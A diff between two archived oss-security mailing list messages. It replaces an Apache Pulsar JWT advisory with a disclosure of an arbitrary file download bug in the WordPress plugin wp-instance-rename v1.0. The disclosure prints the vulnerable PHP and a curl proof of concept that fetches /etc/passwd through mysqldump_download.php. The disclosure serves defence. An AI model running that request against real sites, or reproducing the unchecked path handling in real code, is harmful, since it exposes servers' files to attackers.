@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["749" "Tuesday" "25" "May" "2021" "21:32:35" "+0800" "PengHui Li" "penghui@apache.org" nil "27" "[oss-security] CVE-2021-22160 Apache Pulsar Information Disclosure" nil nil nil "5" nil nil (number mark "U       penghui@apac May 25   27/749   " thread-indent "\"[oss-security] CVE-2021-22160 Apache Pulsar Information Disclosure\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] CVE-2021-22160 Apache Pulsar Information Disclosure" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["1706" "Tuesday" "23" "June" "2015" "16:08:55" "-0400" "Larry W. Cashdollar" "larry0@me.com" "<C3898405-E7BE-469E-8C9F-4A827F7370A5@me.com>" "51" "[oss-security] Arbitrary File download in wordpress plugin wp-instance-rename v1.0" nil nil nil "6" "2015062320:08:55" "[oss-security] Arbitrary File download in wordpress plugin wp-instance-rename v1.0" (number mark "U       larry0@me.co Jun 23   51/1706  " thread-indent "\"[oss-security] Arbitrary File download in wordpress plugin wp-instance-rename v1.0\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 11617 invoked by uid 550); 25 May 2021 14:15:03 -0000
+Received: (qmail 12077 invoked by uid 550); 23 Jun 2015 20:10:04 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,45 +12,71 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 13669 invoked from network); 25 May 2021 13:33:37 -0000
-X-Gm-Message-State: AOAM532S6y/WyaAsqtP8voty7R4R13TvQFeirRBVrp0URtaAkoNHgmTb
-	Lw95zrsEmn6XM8m5/FyVk9ohCT9Ez4rPyUmEU8M=
-X-Google-Smtp-Source: ABdhPJzImw/klN9J6pFGYrJ+cyt8xGIR4OV3TBDQnbwFLcLbRb3J6ajosVqEQJV4X7QlhjQtXl0+foPRMMHOoma6zwI=
-X-Received: by 2002:ac2:4423:: with SMTP id w3mr13699713lfl.208.1621949588346;
- Tue, 25 May 2021 06:33:08 -0700 (PDT)
-MIME-Version: 1.0
-From: PengHui Li <penghui@apache.org>
-Date: Tue, 25 May 2021 21:32:35 +0800
-X-Gmail-Original-Message-ID: <CAJVHGGx-d9_mBWHU=hr74CsrsxvLwsq65+ZHhOGiKU3qgkw=nQ@mail.gmail.com>
-Message-ID: <CAJVHGGx-d9_mBWHU=hr74CsrsxvLwsq65+ZHhOGiKU3qgkw=nQ@mail.gmail.com>
-To: oss-security@lists.openwall.com
-Content-Type: multipart/alternative; boundary="0000000000000e9d5d05c32791e8"
-Subject: [oss-security] CVE-2021-22160 Apache Pulsar Information Disclosure
+Received: (qmail 11481 invoked from network); 23 Jun 2015 20:09:08 -0000
+X-Proofpoint-Virus-Version: vendor=fsecure
+ engine=2.50.10432:5.14.151,1.0.33,0.0.0000
+ definitions=2015-06-23_07:2015-06-23,2015-06-23,1970-01-01 signatures=0
+X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
+ suspectscore=0 phishscore=0 adultscore=0 bulkscore=0 classifier=spam adjust=0
+ reason=mlx scancount=1 engine=7.0.1-1412110000 definitions=main-1506230320
+From: "Larry W. Cashdollar" <larry0@me.com>
+Content-type: text/plain; charset=utf-8
+Content-transfer-encoding: quoted-printable
+Message-id: <C3898405-E7BE-469E-8C9F-4A827F7370A5@me.com>
+Date: Tue, 23 Jun 2015 16:08:55 -0400
+To: Open Source Security <oss-security@lists.openwall.com>
+MIME-version: 1.0 (Mac OS X Mail 8.2 \(2098\))
+X-Mailer: Apple Mail (2.2098)
+Subject: [oss-security] Arbitrary File download in wordpress plugin wp-instance-rename v1.0
 
---0000000000000e9d5d05c32791e8
-Content-Type: text/plain; charset="UTF-8"
-Content-Transfer-Encoding: quoted-printable
+Title: Arbitrary File download in wordpress plugin wp-instance-rename v1.0
+Author: Larry W. Cashdollar, @_larry0
+Date: 2015-06-12
+Download Site: https://wordpress.org/plugins/wp-instance-rename/
+Vendor: Vlajo
+Vendor Notified: 2015-06-12
+Advisory: http://www.vapid.dhs.org/advisory.php?v=3D127
+Vendor Contact:
+Description: WordPress Rename plugin allows you to easily rename the comple=
+te WordPress installation. This plugin allows you to rename WordPress datab=
+ase, WordPress directory, change every necessary configuration file, easily=
+ from one page.
+Vulnerability:
+The code in mysqldump_download.php doesn't check that the requested file is=
+ within the intended download directory:
 
-CVE-2021-22160 Apache Pulsar Information Disclosure
+try{
+	$dbname   =3D $_GET["dbname"];
+	$dumpfname =3D $_GET["dumpfname"];
+	$backup_folder =3D $_GET["backup_folder"];=09
+}catch (Exception $e){}
 
-Severity: High
+if(empty($backup_folder)){
+	$backup_folder=3D"backup/";
+}
+echo "$dumpfname";
+if (file_exists($dumpfname)) {=09=09
+	// zip the dump file=09
+	$name=3D$dbname . "_" . date("Y-m-d");=09
+	$zipfname =3D $backup_folder.$name.".zip";
+	$zip =3D new ZipArchive();=09
+	if($zip->open($zipfname,ZIPARCHIVE::CREATE))=20
+	{
+	   $zip->addFile($dumpfname,$dumpfname);
+	   $zip->close();
+	}=09
+	// read zip file and send it to standard output
+	if (file_exists($zipfname)) {
+		header('Content-Description: File Transfer');
+		header('Content-Type: application/octet-stream');
+		header('Content-Disposition: attachment; filename=3D'.basename($zipfname)=
+);
+		flush();
+		readfile($zipfname);
 
-Versions Affected:
-Apache Pulsar < 2.7.1
-
-Description:
-If Apache Pulsar is configured to authenticate clients using tokens
-based on JSON Web Tokens (JWT), the signature of the token is not
-validated if the algorithm of the presented token is set to "none".
-This allows an attacker to connect to Pulsar instances as any user
-(incl. admins).
-
-Mitigation:
-Users of the affected versions should apply one of the following
-mitigations:
-Upgrade to Apache Pulsar 2.7.1 or later
-
-Credit:
-This issue was identified by Peter St=C3=B6ckli
-
---0000000000000e9d5d05c32791e8--
+CVEID: 2015-4703
+OSVDB:
+Exploit Code:
+	=E2=80=A2 curl --data "dbname=3Dwp&dumpfname=3D/etc/passwd&backup_folder=
+=3D."  http://www.example.com/wp-instance-rename/mysqldump_download.php -o =
+p.zip=20=
